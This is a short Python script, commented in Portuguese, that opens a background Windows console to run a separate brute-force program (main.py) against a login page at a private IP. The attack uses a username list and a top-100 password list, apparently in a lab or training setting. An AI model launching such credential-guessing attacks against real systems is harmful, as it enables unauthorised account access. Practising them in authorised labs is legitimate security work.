#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Script para abrir um novo terminal Windows e rodar o brute-force em separado,
SEM fechar nem desviar o foco do terminal atual.
"""

import subprocess
import sys
from pathlib import Path

def main():
    python_exe = Path(r"C:/Users/a914686/AppData/Local/Programs/Python/Python312/python.exe")
    script     = Path(r"main.py")
    url        = "http://10.129.1.15/login.php"
    user_file  = "usernames_300.txt"
    pass_file  = "10-million-password-list-top-100.txt"
    fail_flag  = "Please sign in"

    cmd = [
        str(python_exe),
        str(script),
        url,
        "-U", user_file,
        "-P", pass_file,
        "-f", fail_flag
    ]

    print("Abrindo nova janela em background e executando:")
    print("  " + " ".join(cmd))

    # flags do Windows para não roubar foco
    creation_flag = subprocess.CREATE_NEW_CONSOLE
    STARTF_USESHOWWINDOW = 1
    SW_SHOWNOACTIVATE    = 4

    si = subprocess.STARTUPINFO()
    si.dwFlags |= STARTF_USESHOWWINDOW
    si.wShowWindow = SW_SHOWNOACTIVATE

    try:
        subprocess.Popen(
            cmd,
            creationflags=creation_flag,
            startupinfo=si,
        )
    except Exception as e:
        print("Erro ao abrir nova janela:", e, file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
